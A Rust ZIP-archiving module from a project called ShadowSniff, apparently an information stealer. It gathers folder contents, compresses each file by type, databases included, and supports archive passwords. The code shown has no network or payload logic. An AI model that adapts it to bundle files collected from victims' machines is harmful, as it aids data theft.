/*
 * This file is part of ShadowSniff (https://github.com/sqlerrorthing/ShadowSniff)
 *
 * MIT License
 *
 * Copyright (c) 2025 sqlerrorthing
 *
 * Permission is hereby granted, free of charge, to any person obtaining a copy
 * of this software and associated documentation files (the "Software"), to deal
 * in the Software without restriction, including without limitation the rights
 * to use, copy, modify, merge, publish, distribute, sublicense, and/or sell
 * copies of the Software, and to permit persons to whom the Software is
 * furnished to do so, subject to the following conditions:
 *
 * The above copyright notice and this permission notice shall be included in all
 * copies or substantial portions of the Software.
 *
 * THE SOFTWARE IS PROVIDED "AS IS", WITHOUT WARRANTY OF ANY KIND, EXPRESS OR
 * IMPLIED, INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF MERCHANTABILITY,
 * FITNESS FOR A PARTICULAR PURPOSE AND NONINFRINGEMENT. IN NO EVENT SHALL THE
 * AUTHORS OR COPYRIGHT HOLDERS BE LIABLE FOR ANY CLAIM, DAMAGES OR OTHER
 * LIABILITY, WHETHER IN AN ACTION OF CONTRACT, TORT OR OTHERWISE, ARISING FROM,
 * OUT OF OR IN CONNECTION WITH THE SOFTWARE OR THE USE OR OTHER DEALINGS IN THE
 * SOFTWARE.
 */

#![no_std]

extern crate alloc;
mod create;

use crate::create::create_zip;
use alloc::string::{String, ToString};
use alloc::sync::Arc;
use alloc::vec::Vec;
use core::mem::zeroed;
use core::ops::Deref;
use filesystem::path::Path;
use filesystem::{FileSystem, FileSystemExt};
use miniz_oxide::deflate::compress_to_vec;
use windows_sys::Win32::Foundation::{FILETIME, SYSTEMTIME};
use windows_sys::Win32::System::Time::FileTimeToSystemTime;

pub struct ZipEntry {
    path: String,
    data: Vec<u8>,
    modified: (u16, u16),
    compression: ZipCompression,
}

impl Default for ZipEntry {
    fn default() -> Self {
        Self {
            path: String::new(),
            data: Vec::new(),
            modified: (0, 0),
            compression: ZipCompression::default(),
        }
    }
}

#[derive(Default)]
pub struct ZipArchive {
    entries: Vec<ZipEntry>,
    comment: Option<Arc<str>>,
    password: Option<Arc<str>>,
    compression: ZipCompression,
}

impl AsRef<ZipArchive> for ZipArchive {
    fn as_ref(&self) -> &ZipArchive {
        self
    }
}

impl Deref for ZipEntry {
    type Target = Vec<u8>;

    fn deref(&self) -> &Self::Target {
        self.data.as_ref()
    }
}

#[derive(Copy, Clone)]
pub enum ZipCompression {
    NONE,

    DEFLATE(u8),
}

impl Default for ZipCompression {
    fn default() -> Self {
        ZipCompression::DEFLATE(10)
    }
}

impl ZipCompression {
    pub fn compress(&self, data: &[u8]) -> Vec<u8> {
        match self {
            ZipCompression::DEFLATE(level) => compress_to_vec(data, *level),
            ZipCompression::NONE => Vec::from(data),
        }
    }

    pub fn method(&self) -> u16 {
        match self {
            ZipCompression::DEFLATE(_) => 8u16,
            ZipCompression::NONE => 0u16,
        }
    }
    
    /// Determines optimal compression level based on file extension and size
    /// Returns a compression level (0-10) or NONE if compression is not beneficial
    pub fn adaptive_level_for_file(path: &str, size: usize) -> Self {
        // Files smaller than 64 bytes: compression overhead not worth it
        if size < 64 {
            return ZipCompression::NONE;
        }
        
        // Extract extension
        let extension = path
            .rfind('.')
            .and_then(|pos| path.get(pos + 1..))
            .unwrap_or("")
            .to_lowercase();
        
        // Already compressed formats: use lower compression
        let already_compressed = matches!(
            extension.as_str(),
            "zip" | "gz" | "bz2" | "xz" | "7z" | "rar" | "jpg" | "jpeg" | "png" 
            | "gif" | "mp3" | "mp4" | "avi" | "mkv" | "webm" | "pdf" | "docx" | "xlsx" | "pptx"
        );
        
        // Text/json/sql files benefit more from compression
        let text_like = matches!(
            extension.as_str(),
            "txt" | "log" | "json" | "xml" | "html" | "css" | "js" | "sql" | "csv" | "ini" | "cfg" | "conf"
        );
        
        // SQLite databases: moderate compression (they're already somewhat compressed)
        let database = extension == "db" || extension == "sqlite" || extension == "sqlite3";
        
        // Determine compression level
        let level = if already_compressed {
            // Level 1-3: fast compression, minimal benefit expected
            2
        } else if text_like {
            // Level 6-9: good compression for text files
            8
        } else if database {
            // Level 4-6: moderate compression for databases
            5
        } else {
            // Default: balanced compression
            6
        };
        
        ZipCompression::DEFLATE(level)
    }
}

impl ZipArchive {
    pub fn comment<S>(mut self, comment: S) -> Self
    where
        S: AsRef<str>,
    {
        self.comment = Some(Arc::from(comment.as_ref()));
        self
    }

    pub fn password<S>(mut self, password: S) -> Self
    where
        S: AsRef<str>,
    {
        assert!(password.as_ref().is_ascii(), "Password must be ASCII only");
        self.password = Some(Arc::from(password.as_ref()));
        self
    }

    pub fn compression(mut self, compression: ZipCompression) -> Self {
        self.compression = compression;
        self
    }

    pub fn add_folder_content<F, P>(mut self, filesystem: &F, root: P) -> Self
    where
        P: AsRef<Path>,
        F: FileSystem,
    {
        let root = root.as_ref();
        let _ = self.add_folder_content_internal(filesystem, root, root, true);
        self
    }

    pub fn add_folder<F, P>(&mut self, filesystem: &F, folder: P) -> &mut Self
    where
        P: AsRef<Path>,
        F: FileSystem,
    {
        let folder = folder.as_ref();
        let _ = self.add_folder_content_internal(filesystem, folder, folder, false);
        self
    }

    pub fn add_file<F, P>(&mut self, filesystem: &F, file: P) -> &mut Self
    where
        P: AsRef<Path>,
        F: FileSystem,
    {
        let file = file.as_ref();
        let _ = self.add_file_internal(filesystem, file);
        self
    }

    fn add_file_internal<F>(&mut self, filesystem: &F, file: &Path) -> Option<()>
    where
        F: FileSystem,
    {
        if !filesystem.is_file(file) {
            return None;
        }

        let full_name = file.fullname()?;
        let file_time = filesystem.get_filetime(file).unwrap_or((0, 0));

        let data = filesystem.read_file(file).ok()?;
        
        // Use adaptive compression if default compression is set
        let entry_compression = match self.compression {
            ZipCompression::DEFLATE(_) => {
                // Use adaptive compression based on file type and size
                ZipCompression::adaptive_level_for_file(&full_name, data.len())
            }
            ZipCompression::NONE => ZipCompression::NONE,
        };

        let entry = ZipEntry {
            path: full_name.to_string(),
            data,
            modified: filetime_to_dos_date_time(&file_time),
            compression: entry_compression,
        };

        self.entries.push(entry);

        Some(())
    }

    fn add_folder_content_internal<F>(
        &mut self,
        filesystem: &F,
        root: &Path,
        file: &Path,
        use_parent: bool,
    ) -> Option<()>
    where
        F: FileSystem,
    {
        if !filesystem.is_exists(file) || !filesystem.is_exists(root) {
            return None;
        }

        for file in &filesystem.list_files(file)? {
            if filesystem.is_dir(file) {
                self.add_folder_content_internal(filesystem, root, file, use_parent)?
            } else if filesystem.is_file(file) {
                let data = filesystem.read_file(file).ok()?;
                let file_time = filesystem.get_filetime(file).unwrap_or((0, 0));

                let rel_path = if use_parent {
                    file.strip_prefix(root.deref())?.strip_prefix("\\")?
                } else {
                    file.deref()
                };

                // Use adaptive compression if default compression is set
                let entry_compression = match self.compression {
                    ZipCompression::DEFLATE(_) => {
                        ZipCompression::adaptive_level_for_file(&rel_path.to_string(), data.len())
                    }
                    ZipCompression::NONE => ZipCompression::NONE,
                };

                let entry = ZipEntry {
                    path: rel_path.to_string(),
                    data,
                    modified: filetime_to_dos_date_time(&file_time),
                    compression: entry_compression,
                };

                self.entries.push(entry);
            }
        }

        Some(())
    }

    pub fn get_password(&self) -> Option<Arc<str>> {
        self.password.clone()
    }

    pub fn get_comment(&self) -> Option<Arc<str>> {
        self.comment.clone()
    }

    pub fn create(&self) -> Vec<u8> {
        create_zip(self)
    }
}

fn filetime_to_dos_date_time(file_time: &(u32, u32)) -> (u16, u16) {
    let mut sys_time: SYSTEMTIME = unsafe { zeroed() };
    let file_time = FILETIME {
        dwLowDateTime: file_time.0,
        dwHighDateTime: file_time.1,
    };

    unsafe {
        if FileTimeToSystemTime(&file_time, &mut sys_time) == 0 {
            return (0, 0);
        }
    }

    let dos_time: u16 = (sys_time.wHour << 11) | (sys_time.wMinute << 5) | (sys_time.wSecond / 2);

    let year = sys_time.wYear as i32;
    let dos_date: u16 = (((year - 1980) as u16) << 9) | sys_time.wMonth << 5 | sys_time.wDay;

    (dos_time, dos_date)
}
